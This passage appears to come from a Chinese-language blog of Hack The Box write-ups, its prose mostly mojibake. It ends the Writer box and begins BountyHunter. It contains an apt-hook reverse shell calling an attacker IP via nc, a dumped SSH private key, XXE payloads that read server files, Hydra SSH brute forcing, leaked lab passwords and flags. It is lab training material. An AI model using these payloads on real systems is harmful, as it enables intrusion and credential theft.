è¿™æ˜¯å‘é€é‚®ä»¶çš„è„šæœ¬ ä¸Šä¼ åˆ°æœåŠ¡å™¨ ç„¶åä½¿ç”¨ncç›‘å¬ç«¯å£ nc -nvlp 4444 æ‹·è´disclaimeræ–‡ä»¶å¹¶å‘é€é‚®ä»¶ cp disclaimer /etc/postfix/disclaimer &amp;&amp; python3 sendmail.py æˆåŠŸå¾—åˆ°johnçš„shell â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 44352 bash: cannot set terminal process group (78664): Inappropriate ioctl for device bash: no job control in this shell john@writer:/var/spool/postfix$ whoami&amp;&amp;id whoami&amp;&amp;id john uid=1001(john) gid=1001(john) groups=1001(john) å¾—åˆ°johnçš„æƒé™ï¼Œåœ¨/home/john/.ssh/ç›®å½•ä¸‹æ‹¿åˆ°id_rsaæ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ° -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- ç»™äºˆæƒé™ chmod 600 id_rsa ç„¶åä½¿ç”¨sshè¿›è¡Œç™»å½•johnç”¨æˆ· ssh john@10.10.11.101 -i id_rsa ç™»å…¥åææƒ &gt; å‚è€ƒè¿æ¥ https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/ cd /etc/apt/apt.conf.d echo &#39;apt::Update::Pre-Invoke {&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.110 4444 &gt;/tmp/f&quot;};&#39; &gt; exp ç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åç­‰ç€rootæ‰§è¡Œè¯¥è„šæœ¬å³å¯ï¼Œå¯èƒ½éœ€è¦ç­‰å‡ åˆ†é’Ÿ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 41008 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami &amp;&amp; id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ°root # cat root.txt 3664a02fe4477fdc202e27ec4e29de82 æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"BountyHunter - Hackthebox","slug":"Hackthebox - BountyHunter","date":"2021-07-25T11:38:36.000Z","updated":"2023-05-20T01:26:09.000Z","comments":true,"path":"2021/07/25/Hackthebox - BountyHunter/","link":"","permalink":"http://www.lucifiel.com/2021/07/25/Hackthebox%20-%20BountyHunter/","excerpt":"","text":"Hackthebox - BountyHunteré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:02 CST Nmap scan report for 10.10.11.100 Host is up (0.25s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/25%OT=22%CT=1%CU=31546%PV=Y%DS=2%DC=T%G=Y%TM=60FCF27 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 251.53 ms 10.10.14.1 2 251.65 ms 10.10.11.100 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 546.93 seconds ä»æ‰«æç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å‡ ä¸ªä¿¡æ¯ï¼š - æœ¬å°é¶æœºå¼€å¯äº†22ã€80ç«¯å£ - æœ¬å°80ç«¯å£ä½¿ç”¨äº†Apache&#x2F;2.4.41ä½œä¸ºHTTPæœåŠ¡ å’±ä»¬å»è®¿é—®80ç«¯å£çœ‹çœ‹å†…å®¹ã€‚ è¿™å¥½åƒæ˜¯ä¸€ä¸ªSRCå¹³å°ï¼Ÿä¸“ä¸šå¯¹å£ å‘ç°äº†ä¸€ä¸ªphpæ–‡ä»¶ http://10.10.11.100/log_submit.php ç®€å•æµ‹è¯•äº†ä¸€ä¸‹XSSï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå…ˆæ”¾ç€ä¸ç®¡æˆ‘ä»¬æ‰¾æ‰¾å…¶ä»–æ€è·¯ å…ˆåšä¸€ä¸ªFUZZçœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/25 13:24:30 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 277] /.hta.txt (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.hta (Status: 403) [Size: 277] /.hta.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.hta.html (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /assets (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/] /css (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/] /db.php (Status: 200) [Size: 0] /index.php (Status: 200) [Size: 25169] /index.php (Status: 200) [Size: 25169] /js (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/] /portal.php (Status: 200) [Size: 125] /resources (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/] /server-status (Status: 403) [Size: 277] =============================================================== 2021/07/25 13:32:25 Finished =============================================================== å’±ä»¬çœ‹çœ‹/resourcesç›®å½• Index of /resources [ICO] Name Last modified Size Description [PARENTDIR] Parent Directory - [TXT] README.txt 2021-04-06 00:01 210 [ ] all.js 2021-04-05 17:37 1.1M [ ] bootstrap.bundle.min.js 2021-04-05 17:41 82K [ ] bootstrap_login.min.js 2021-04-05 17:08 48K [ ] bountylog.js 2021-06-15 15:47 594 [ ] jquery.easing.min.js 2020-05-04 09:11 2.5K [ ] jquery.min.js 2020-05-04 16:01 87K [ ] jquery_login.min.js 2021-04-05 17:09 85K [TXT] lato.css 2021-04-05 17:39 2.6K [TXT] monsterat.css 2021-04-05 17:39 3.2K Apache/2.4.41 (Ubuntu) Server at 10.10.11.100 Port 80 å’±ä»¬æŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹ åœ¨README.txtä¸­å‘ç°äº†ä¸€ä¸ªæç¤º Tasks: [ ] Disable &#39;test&#39; account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨/bountylog.jsè¿™ä¸ªæ–‡ä»¶ä¸Š function returnSecret(data) { return Promise.resolve($.ajax({ type: &quot;POST&quot;, data: {&quot;data&quot;:data}, url: &quot;tracker_diRbPr00f314.php&quot; })); } async function bountySubmit() { try { var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;bugreport&gt; &lt;title&gt;${$(&#39;#exploitTitle&#39;).val()}&lt;/title&gt; &lt;cwe&gt;${$(&#39;#cwe&#39;).val()}&lt;/cwe&gt; &lt;cvss&gt;${$(&#39;#cvss&#39;).val()}&lt;/cvss&gt; &lt;reward&gt;${$(&#39;#reward&#39;).val()}&lt;/reward&gt; &lt;/bugreport&gt;` let data = await returnSecret(btoa(xml)); $(&quot;#return&quot;).html(data) } catch(error) { console.log(&#39;Error:&#39;, error); } } æ¼æ´åˆ©ç”¨çœ‹åˆ°è¿™é‡Œå’±ä»¬æ¢³ç†ä¸€ä¸‹æ€è·¯å“ˆ http://10.10.11.100/log_submit.phpä¸­æç¤ºæ˜¯ä¸€ä¸ªæäº¤çª—å£ http://10.10.11.100/resources/README.txtä¸­æç¤ºæˆ‘ä»¬è¦å†™ä¸€ä¸ªæäº¤è„šæœ¬åˆ°æ•°æ®åº“ï¼Œä½†æˆ‘ä»¬ç›®å‰å¹¶ä¸çŸ¥é“è¦å†™ä»€ä¹ˆè„šæœ¬ http://10.10.11.100/resources/bountylog.jsä¸­æç¤ºæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªXMLè„šæœ¬æäº¤åˆ°tracker_diRbPr00f314.phpï¼Œå¹¶ä¸”ç»™å‡ºäº†æˆ‘ä»¬è„šæœ¬æ ¼å¼ æˆ‘ä»¬è®¿é—®tracker_diRbPr00f314.phpåå¯ä»¥çœ‹åˆ°ï¼Œå†…å®¹å°±æ˜¯http://10.10.11.100/log_submit.phpæäº¤åè¿”å›çš„å†…å®¹ å¹³æ—¶æˆ‘æ˜¯ä¸ä¼šå†™è¿™ä¹ˆè¯¦ç»†çš„ï¼Œè¿™é‡Œå•çº¯æ˜¯æ€¼æŸä¸ªè¯´æˆ‘æŠ„åˆ«äººå†…å®¹çš„æ ç²¾ï¼Œç»™ä½ çœ‹çœ‹æˆ‘çš„è§£é¢˜æ€è·¯ï¼Œçœ‹çœ‹åˆ°åº•æ˜¯æŠ„çš„åˆ«äººçš„è¿˜æ˜¯æˆ‘è‡ªå·±æƒ³çš„ï¼Œå®ååˆ¶DISSä½ ï¼Œä¸æœéšæ—¶æ¥æ  ç„¶åå’±ä»¬æ•´ç†ä¸€ä¸‹æ‰‹ä¸Šæœ‰çš„ä¿¡æ¯ 1. å’±ä»¬æ‰‹é‡Œæœ‰ä¸€ä¸ªæäº¤çª—å£/log_submit.php 2. å’±ä»¬æœ‰ä¸€ä¸ªä¸€çœ‹å°±å¾ˆé‡è¦ä½†æ²¡æœ‰å†…å®¹çš„æ–‡ä»¶/db.php 3. æœ‰ä¸€ä¸ªXMLæ³¨å…¥çš„ç¤ºä¾‹è„šæœ¬ OKï¼Œç›®æ ‡å¾ˆæ˜ç¡®äº†ï¼Œå’±ä»¬ä½¿ç”¨XMLæ³¨å…¥å»è¯»å–/db.phpæ–‡ä»¶çš„å†…å®¹å³å¯ é’ˆå¯¹è¯¥ç›®æ ‡ç¼–å†™è„šæœ¬ var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;&gt; ]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;something&lt;/cwe&gt; &lt;cvss&gt;something&lt;/cvss&gt; &lt;reward&gt;something&lt;/reward&gt; &lt;/bugreport&gt;` æäº¤åˆ°æ§åˆ¶å°ï¼Œç„¶åä½¿ç”¨ returnSecret(btoa(xml)); æ¥è¿›è¡Œè¯»å– æˆåŠŸè¯»å–åˆ°è¯¥æ–‡ä»¶ï¼Œå’±ä»¬çœ‹çœ‹å†…å®¹æ˜¯ä»€ä¹ˆ If DB were ready, would have added: &lt;table&gt; &lt;tr&gt; &lt;td&gt;Title:&lt;/td&gt; &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;CWE:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Score:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Reward:&lt;/td&gt; &lt;td&gt;something&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; çœ‹titleè¿”å›çš„å†…å®¹æ˜¯ä¸€æ®µbase64ç ï¼Œå’±ä»¬å»è§£å¯†è¯•è¯• PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= &lt;?php // TODO -&gt; Implement login system with the database. $dbserver = &quot;localhost&quot;; $dbname = &quot;bounty&quot;; $dbusername = &quot;admin&quot;; $dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;; $testuser = &quot;test&quot;; ?&gt; å’±ä»¬å¾—åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå’±ä»¬è¯»å–/etc/passwdçœ‹çœ‹ var xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;/title&gt; &lt;cwe&gt;something&lt;/cwe&gt; &lt;cvss&gt;something&lt;/cvss&gt; &lt;reward&gt;something&lt;/reward&gt; &lt;/bugreport&gt;` root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin ä¼¼ä¹å’Œæˆ‘æƒ³çš„ä¸ä¸€æ ·å•Šï¼Œè¿™é‡Œæˆ‘ä»¬è·å–åˆ°çš„æ•°æ®åº“ç”¨æˆ·åæ— æ³•ç”¨æ¥è¿›è¡Œsshç™»å½•ï¼Œè¿˜å¾—æ‰¾æ‰¾å…¶ä»–æ€è·¯ å’±ä»¬ä½¿ç”¨hydraè¿›è¡Œçˆ†ç ´è¯•è¯• é¦–å…ˆå°†/etc/passwdçš„æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ° ç„¶åä½¿ç”¨cutå‘½ä»¤æ¥æå–ç”¨æˆ·å cut -d : -f 1 passwd &gt; user â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat user root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody systemd-network systemd-resolve systemd-timesync messagebus syslog _apt tss uuidd tcpdump landscape pollinate sshd systemd-coredump development lxd usbmux ç°åœ¨å°±æŠŠæ‰€æœ‰çš„ç”¨æˆ·åéƒ½æå–å‡ºæ¥äº† ç„¶åä½¿ç”¨hydraè¿›è¡Œçˆ†ç ´ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh 255 â¨¯ Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 14:42:27 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task [DATA] attacking ssh://10.10.11.100:22/ [22][ssh] host: 10.10.11.100 login: development password: m19RoAU0hP41A1sTsq6K [22][ssh] host: 10.10.11.100 login: development password: m19RoAU0hP41A1sTsq6K 1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 14:42:44 ç„¶åç¡®å®šäº†è´¦å·å¯†ç  username = development password = m19RoAU0hP41A1sTsq6K å’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ssh development@10.10.11.100 development@10.10.11.100&#39;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 25 Jul 2021 06:57:17 AM UTC System load: 0.0 Usage of /: 24.3% of 6.83GB Memory usage: 15% Swap usage: 0% Processes: 216 Users logged in: 1 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:7ae5 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Jul 25 04:44:41 2021 from 10.10.14.17 development@bountyhunter:~$ whoami &amp;&amp; id development uid=1000(development) gid=1000(development) groups=1000(development) æˆåŠŸgetshell development@bountyhunter:~$ cat user.txt 12df9cbc3e04ef498fad5cdd101563b4 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ å’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹æƒé™ development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py å’±ä»¬å¯ä»¥åˆ©ç”¨/usr/bin/python3.8ä½¿ç”¨rootæƒé™æ— å¯†ç è¿è¡Œ/opt/skytrain_inc/ticketValidator.pyæ–‡ä»¶ å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() é€šè¿‡è§£è¯»è¿™ä¸ªpythonè„šæœ¬ï¼Œæˆ‘ä»¬å¾—çŸ¥ï¼Œè¿™ä¸ªè„šæœ¬è¦æ±‚æˆ‘ä»¬è¾“å…¥æ–‡ä»¶åï¼Œä¸”æ–‡ä»¶åè¦ä»¥.mdä¸ºç»“å°¾ã€‚å¦‚æœæ¡ä»¶æ»¡è¶³ï¼Œåˆ™è„šæœ¬æ‰“å¼€æ–‡ä»¶å¹¶æœç´¢ä¸‹ä¸€ä¸ªæ¡ä»¶ã€‚ for i,x in enumerate(ticketFile.readlines()): if i == 0: # if line number 0 not startwith &quot;# Skytrain Inc&quot;, Quit, else Continue if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if line number 1 Exist and not startwith &quot;## Ticket to &quot; , Quit else Continue if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): # This is line number 2, as the previous statements are all returned out or continued to here. so line number 2 should be: &quot;__Ticket Code:__&quot; code_line = i+1 continue if code_line and i == code_line: # if code_line exist if not x.startswith(&quot;**&quot;): # if code_line not startwith **, Exit! return False ticketCode = 